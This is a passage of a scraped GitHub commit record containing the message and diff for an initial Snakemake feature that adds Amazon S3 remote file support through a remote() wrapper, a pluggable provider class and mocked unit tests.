for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote\/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard\/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote\/`. This is similar in nature to the function `test_cluster_dynamic\/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS\/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic."}},"https:\/\/github.com\/simeloni\/snakemake":{"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d":{"url":"https:\/\/api.github.com\/repos\/simeloni\/snakemake\/commits\/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","html_url":"https:\/\/github.com\/simeloni\/snakemake\/commit\/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","message":"Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read\/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https:\/\/boto.readthedocs.org\/en\/latest\/ref\/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name\/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name\/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/out.txt\")\n        output:\n            \"bucket-name\/out.txt\"\n        run:\n            shell(\"cp {output[0]} .\/\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote\/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard\/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote\/`. This is similar in nature to the function `test_cluster_dynamic\/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS\/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic.","sha":"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","keyword":"remote code execution protect","diff":"diff --git a\/setup.py b\/setup.py\nindex dfea1dd..97f4d86 100644\n--- a\/setup.py\n+++ b\/setup.py\n@@ -59,6 +59,7 @@ def run_tests(self):\n     },\n     package_data={'': ['*.css', '*.sh', '*.html']},\n     tests_require=['nose>=1.3'],\n+    install_requires=['boto>=2.38.0','filechunkio>=1.6', 'moto>=0.4.14'],\n     cmdclass={'test': NoseTestCommand},\n     classifiers=\n     [\"Development Status :: 5 - Production\/Stable\", \"Environment :: Console\",\ndiff --git a\/snakemake\/dag.py b\/snakemake\/dag.py\nindex f1ead14..e591550 100644\n--- a\/snakemake\/dag.py\n+++ b\/snakemake\/dag.py\n@@ -10,7 +10,7 @@\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n@@ -288,6 +288,51 @@ def unneeded_files():\n             logger.info(\"Removing temporary output file {}.\".format(f))\n             f.remove()\n \n+    def handle_remote(self, job):\n+        \"\"\" Remove local files if they are no longer needed, and upload to S3. \"\"\"\n+        \n+        needed = lambda job_, f: any(\n+            f in files for j, files in self.depending[job_].items()\n+            if not self.finished(j) and self.needrun(j) and j != job)\n+\n+        remote_files = set([f for f in job.expanded_input if f.is_remote]) | set([f for f in job.expanded_output if f.is_remote])\n+        local_files = set([f for f in job.input if not f.is_remote]) | set([f for f in job.expanded_output if not f.is_remote])\n+        files_to_keep = set(f for f in remote_files if is_flagged(f, \"keep\"))\n+\n+        # remove local files from list of remote files\n+        # in case the same file is specified in both places\n+        remote_files -= local_files\n+        remote_files -= files_to_keep\n+\n+        def unneeded_files():\n+            for job_, files in self.dependencies[job].items():\n+                for f in (remote_files & files):\n+                    if not needed(job_, f) and not f.protected:\n+                        yield f\n+            for f in filterfalse(partial(needed, job), [f for f in remote_files]):\n+                if not f in self.targetfiles and not f.protected:\n+                    yield f\n+\n+        def expanded_dynamic_depending_input_files():\n+            for j in self.depending[job]:    \n+                for f in j.expanded_input:\n+                    yield f\n+\n+        unneededFiles = set(unneeded_files())\n+        unneededFiles -= set(expanded_dynamic_depending_input_files())\n+\n+        for f in [f for f in job.expanded_output if f.is_remote]:\n+            if not f.exists_remote:\n+                logger.info(\"Uploading local output file to remote: {}\".format(f))\n+                f.upload_to_remote()\n+\n+        for f in set(unneededFiles):\n+            logger.info(\"Removing local output file: {}\".format(f))\n+            f.remove()\n+\n+        job.rmdir_empty_remote_dirs()\n+\n+\n     def jobid(self, job):\n         if job not in self._jobid:\n             self._jobid[job] = len(self._jobid)\ndiff --git a\/snakemake\/decorators.py b\/snakemake\/decorators.py\nnew file mode 100644\nindex 0000000..063ddde\n--- \/dev\/null\n+++ b\/snakemake\/decorators.py\n@@ -0,0 +1,31 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import functools\n+import inspect\n+\n+\n+def memoize(obj):\n+    cache = obj.cache = {}\n+\n+    @functools.wraps(obj)\n+    def memoizer(*args, **kwargs):\n+        key = str(args) + str(kwargs)\n+        if key not in cache:\n+            cache[key] = obj(*args, **kwargs)\n+        return cache[key]\n+\n+    return memoizer\n+\n+\n+def decAllMethods(decorator, prefix='test_'):\n+\n+    def decClass(cls):\n+        for name, m in inspect.getmembers(cls, inspect.isfunction):\n+            if prefix == None or name.startswith(prefix):\n+                setattr(cls, name, decorator(m))\n+        return cls\n+\n+    return decClass\ndiff --git a\/snakemake\/exceptions.py b\/snakemake\/exceptions.py\nindex d606c99..7440442 100644\n--- a\/snakemake\/exceptions.py\n+++ b\/snakemake\/exceptions.py\n@@ -281,6 +281,13 @@ class IOFileException(RuleException):\n     def __init__(self, msg, lineno=None, snakefile=None):\n         super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n+class RemoteFileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n+\n+class S3FileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n class ClusterJobException(RuleException):\n     def __init__(self, job, jobid, jobscript):\ndiff --git a\/snakemake\/executors.py b\/snakemake\/executors.py\nindex 6bd0114..961e7ba 100644\n--- a\/snakemake\/executors.py\n+++ b\/snakemake\/executors.py\n@@ -109,6 +109,7 @@ def print_job_error(self, job):\n     def finish_job(self, job):\n         self.dag.handle_touch(job)\n         self.dag.check_output(job, wait=self.latency_wait)\n+        self.dag.handle_remote(job)\n         self.dag.handle_protected(job)\n         self.dag.handle_temp(job)\n \ndiff --git a\/snakemake\/io.py b\/snakemake\/io.py\nindex 0ba9cbd..3e32628 100644\n--- a\/snakemake\/io.py\n+++ b\/snakemake\/io.py\n@@ -8,11 +8,12 @@\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n@@ -45,9 +46,46 @@ def __new__(cls, file):\n         obj._file = file\n         obj.rule = None\n         obj._regex = None\n+\n         return obj\n \n+    def __init__(self, file):\n+        self._remote_object = None\n+        if self.is_remote:\n+            additional_args = get_flag_value(self._file, \"additional_remote_args\") if get_flag_value(self._file, \"additional_remote_args\") else []\n+            additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+            self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, *additional_args, **additional_kwargs)\n+        pass\n+\n+    def _referToRemote(func):\n+        \"\"\" \n+            A decorator so that if the file is remote and has a version \n+            of the same file-related function, call that version instead. \n+        \"\"\"\n+        @functools.wraps(func)\n+        def wrapper(self, *args, **kwargs):\n+            if self.is_remote:\n+                if self.remote_object:\n+                    if hasattr( self.remote_object, func.__name__):\n+                        return getattr( self.remote_object, func.__name__)(*args, **kwargs)\n+            return func(self, *args, **kwargs)\n+        return wrapper\n+\n     @property\n+    def is_remote(self):\n+        return is_flagged(self._file, \"remote\")\n+    \n+    @property\n+    def remote_object(self):\n+        if not self._remote_object:\n+            if self.is_remote:\n+               additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+               self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, **additional_kwargs)\n+        return self._remote_object\n+    \n+\n+    @property\n+    @_referToRemote\n     def file(self):\n         if not self._is_function:\n             return self._file\n@@ -56,32 +94,74 @@ def file(self):\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n@@ -108,9 +188,10 @@ def protect(self):\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n@@ -136,11 +217,21 @@ def apply_wildcards(self, wildcards,\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n@@ -166,6 +257,17 @@ def match(self, target):\n     def format_dynamic(self):\n         return self.replace(self.dynamic_fill, \"{*}\")\n \n+    def clone_flags(self, other):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        if isinstance(other._file, AnnotatedString):\n+            self._file.flags = getattr(other._file, \"flags\", {})\n+\n+    def set_flags(self, flags):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        self._file.flags = flags\n+\n     def __eq__(self, other):\n         f = other._file if isinstance(other, _IOFile) else other\n         return self._file == f\n@@ -286,9 +388,17 @@ def flag(value, flag_type, flag_value=True):\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n@@ -297,6 +407,9 @@ def temp(value):\n     if is_flagged(value, \"protected\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n     return flag(value, \"temp\")\n \n \n@@ -310,6 +423,9 @@ def protected(value):\n     if is_flagged(value, \"temp\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n     return flag(value, \"protected\")\n \n \n@@ -318,7 +434,7 @@ def dynamic(value):\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n@@ -334,6 +450,36 @@ def dynamic(value):\n def touch(value):\n     return flag(value, \"touch\")\n \n+def remote(value, provider=S3, keep=False, additional_args=None, additional_kwargs=None):\n+\n+    additional_args = [] if not additional_args else additional_args\n+    additional_kwargs = {} if not additional_kwargs else additional_kwargs\n+\n+    if not provider:\n+        raise RemoteFileException(\"Provider (S3, etc.) must be specified for remote file as kwarg.\")\n+    if is_flagged(value, \"temp\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"protected\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n+    return flag(\n+                flag(\n+                    flag( \n+                        flag( \n+                            flag(value, \"remote\"), \n+                            \"remote_provider\", \n+                            provider\n+                        ), \n+                        \"additional_remote_kwargs\", \n+                        additional_kwargs\n+                    ),\n+                    \"additional_remote_args\",\n+                    additional_args\n+                ),\n+                \"keep\",\n+                keep\n+            )\n \n def expand(*args, **wildcards):\n     \"\"\"\n@@ -410,6 +556,31 @@ def glob_wildcards(pattern):\n                     getattr(wildcards, name).append(value)\n     return wildcards\n \n+def glob_wildcards_remote(pattern, provider=S3, additional_kwargs=None):\n+    additional_kwargs = additional_kwargs if additional_kwargs else {}\n+    referenceObj = IOFile(remote(pattern, provider=provider, **additional_kwargs))\n+    key_list = [k.name for k in referenceObj._remote_object.list] \n+\n+    pattern = \".\/\"+ referenceObj._remote_object.name\n+    pattern = os.path.normpath(pattern)\n+    first_wildcard = re.search(\"{[^{]\", pattern)\n+    dirname = os.path.dirname(pattern[:first_wildcard.start(\n+    )]) if first_wildcard else os.path.dirname(pattern)\n+    if not dirname:\n+        dirname = \".\"\n+\n+    names = [match.group('name')\n+             for match in _wildcard_regex.finditer(pattern)]\n+    Wildcards = namedtuple(\"Wildcards\", names)\n+    wildcards = Wildcards(*[list() for name in names])\n+\n+    pattern = re.compile(regex(pattern))\n+    for f in key_list:\n+        match = re.match(pattern, f)\n+        if match:\n+            for name, value in match.groupdict().items():\n+                getattr(wildcards, name).append(value)\n+    return wildcards\n \n # TODO rewrite Namedlist!\n class Namedlist(list):\ndiff --git a\/snakemake\/jobs.py b\/snakemake\/jobs.py\nindex fdba8b5..317c7c4 100644\n--- a\/snakemake\/jobs.py\n+++ b\/snakemake\/jobs.py\n@@ -13,7 +13,7 @@\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n@@ -131,7 +131,40 @@ def expanded_output(self):\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n@@ -159,6 +192,34 @@ def missing_input(self):\n         return set(f for f in self.input\n                    if not f.exists and not f in self.subworkflow_input)\n \n+\n+    @property\n+    def present_remote_input(self):\n+        files = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if f.exists_remote:\n+                    files.add(f)\n+        return files\n+    \n+    @property\n+    def present_remote_output(self):\n+        files = set()\n+\n+        for f in self.remote_output:\n+            if f.exists_remote:\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def missing_remote_input(self):\n+        return self.remote_input - self.present_remote_input\n+\n+    @property\n+    def missing_remote_output(self):\n+        return self.remote_output - self.present_remote_output\n+\n     @property\n     def output_mintime(self):\n         \"\"\" Return oldest output file. \"\"\"\n@@ -197,6 +258,74 @@ def missing_output(self, requested=None):\n                     files.add(f)\n         return files\n \n+\n+    @property\n+    def remote_input(self):\n+        for f in self.input:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_output(self):\n+        for f in self.output:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_input_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_input_older_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_older_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    def transfer_updated_files(self):\n+        for f in self.remote_output_older_than_local | self.remote_input_older_than_local:\n+            f.upload_to_remote()\n+\n+        for f in self.remote_output_newer_than_local | self.remote_input_newer_than_local:\n+            f.download_from_remote()\n+    \n+    @property\n+    def files_to_download(self):\n+        toDownload = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if not f.exists_local and f.exists_remote:\n+                    toDownload.add(f)\n+\n+        toDownload = toDownload | self.remote_input_newer_than_local\n+        return toDownload\n+\n+    @property\n+    def files_to_upload(self):\n+        return self.missing_remote_input & self.remote_input_older_than_local\n+\n     @property\n     def existing_output(self):\n         return filter(lambda f: f.exists, self.expanded_output)\n@@ -231,6 +360,10 @@ def prepare(self):\n                 os.remove(f)\n         for f, f_ in zip(self.output, self.rule.output):\n             f.prepare()\n+\n+        for f in self.files_to_download:\n+            f.download_from_remote()\n+\n         for f in self.log:\n             f.prepare()\n         if self.benchmark:\n@@ -239,6 +372,8 @@ def prepare(self):\n     def cleanup(self):\n         \"\"\" Cleanup output files. \"\"\"\n         to_remove = [f for f in self.expanded_output if f.exists]\n+\n+        to_remove.extend([f for f in self.remote_input if f.exists])\n         if to_remove:\n             logger.info(\"Removing output files of failed job {}\"\n                         \" since they might be corrupted:\\n{}\".format(\n@@ -246,6 +381,23 @@ def cleanup(self):\n             for f in to_remove:\n                 f.remove()\n \n+            self.rmdir_empty_remote_dirs()\n+\n+    @property\n+    def empty_remote_dirs(self):\n+        remote_files = [f for f in (set(self.output) | set(self.input)) if f.is_remote]\n+        emptyDirsToRemove = set(os.path.dirname(f) for f in remote_files if not len(os.listdir(os.path.dirname(f))))\n+        return emptyDirsToRemove\n+\n+    def rmdir_empty_remote_dirs(self):\n+        for d in self.empty_remote_dirs:\n+            pathToDel = d\n+            while len(pathToDel) > 0 and len(os.listdir(pathToDel)) == 0:\n+                logger.info(\"rmdir empty dir: {}\".format(pathToDel))\n+                os.rmdir(pathToDel)\n+                pathToDel = os.path.dirname(pathToDel)\n+\n+\n     def format_wildcards(self, string, **variables):\n         \"\"\" Format a string with variables from the job. \"\"\"\n         _variables = dict()\ndiff --git a\/snakemake\/remote_providers\/RemoteObjectProvider.py b\/snakemake\/remote_providers\/RemoteObjectProvider.py\nnew file mode 100644\nindex 0000000..b040e87\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/RemoteObjectProvider.py\n@@ -0,0 +1,50 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+from abc import ABCMeta, abstractmethod\n+\n+\n+class RemoteObject:\n+    \"\"\" This is an abstract class to be used to derive remote object classes for \n+        different cloud storage providers. For example, there could be classes for interacting with \n+        Amazon AWS S3 and Google Cloud Storage, both derived from this common base class.\n+    \"\"\"\n+    __metaclass__ = ABCMeta\n+\n+    def __init__(self, ioFile):\n+        self._iofile = ioFile\n+        self._file = ioFile._file\n+\n+    @abstractmethod\n+    def file(self):\n+        pass\n+\n+    @abstractmethod\n+    def exists(self):\n+        pass\n+\n+    @abstractmethod\n+    def mtime(self):\n+        pass\n+\n+    @abstractmethod\n+    def size(self):\n+        pass\n+\n+    @abstractmethod\n+    def download(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def upload(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def list(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def name(self, *args, **kwargs):\n+        pass\ndiff --git a\/snakemake\/remote_providers\/S3.py b\/snakemake\/remote_providers\/S3.py\nnew file mode 100644\nindex 0000000..77b15ea\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/S3.py\n@@ -0,0 +1,90 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import re\n+\n+from snakemake.remote_providers.RemoteObjectProvider import RemoteObject\n+from 